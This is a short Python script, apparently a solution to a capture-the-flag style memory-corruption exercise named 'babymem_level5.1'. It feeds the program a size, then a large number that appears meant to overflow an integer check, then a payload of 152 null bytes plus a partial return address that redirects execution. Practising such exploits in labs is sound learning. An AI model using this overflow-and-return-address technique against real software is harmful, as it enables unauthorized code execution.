import pwn
r = pwn.process("/challenge/babymem_level5.1")
r.sendline("100")
r.sendline("42949673")
r.send(b'\x00'*152+b'\xc5\x15\x40')
print(r.readall())
